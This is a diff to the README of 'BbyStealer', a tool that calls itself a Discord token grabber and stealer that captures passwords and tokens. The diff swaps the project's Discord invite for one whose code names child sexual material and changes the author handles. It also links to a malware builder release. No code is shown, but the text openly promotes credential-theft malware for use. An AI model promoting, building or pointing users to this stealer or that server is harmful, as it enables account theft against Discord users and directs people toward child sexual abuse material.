@@ -1,12 +1,10 @@
-##### [🌍 Discord Server](https://discord.gg/partner) -  [:gem: Premium](https://discord.gg/partner) - [🔧 Builder](https://github.com/raiderxdd/bbystealer/releases/tag/Builder) - [💡 Features](https://github.com/raiderxdd/bbystealer#features) 
+##### [🌍 Discord Server](https://discord.gg/teenporn) -  [:gem: Premium](https://discord.gg/teenporn) - [🔧 Builder](https://github.com/raiderxdd/bbystealer/releases/tag/Builder) - [💡 Features](https://github.com/raiderxdd/bbystealer#features) 
 
 ### Authors
-- Râider.#0004
-- Syborg#0004
+- Râider#2305
 
 ### Contributors
-- Râider.#0004
-- Syborg#0004
+- Râider#2305
 
 # BbyStealer
 The new modern discord token grabber & token stealer, with discord password & token even when it changes
